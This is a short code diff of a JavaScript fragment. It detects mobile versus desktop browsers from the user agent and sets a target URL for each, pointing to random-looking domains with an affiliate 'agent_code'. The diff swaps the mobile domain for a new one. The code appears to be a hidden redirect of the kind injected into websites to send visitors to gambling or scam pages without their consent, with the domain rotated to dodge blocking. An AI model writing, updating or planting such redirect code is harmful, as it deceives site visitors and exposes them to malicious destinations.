@@ -4,7 +4,7 @@ if (!reg.test(navigator.userAgent)) {
 let flag = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i);
 if (flag) {
 //k
-_src = 'https://www.nmsd82.com:9070/?agent_code=6342892'
+_src = 'https://www.qw3gm.com:9070/?agent_code=6342892'
 } else {
 // PC
 _src = 'https://www.irra6.com/?agent_code=6342892'
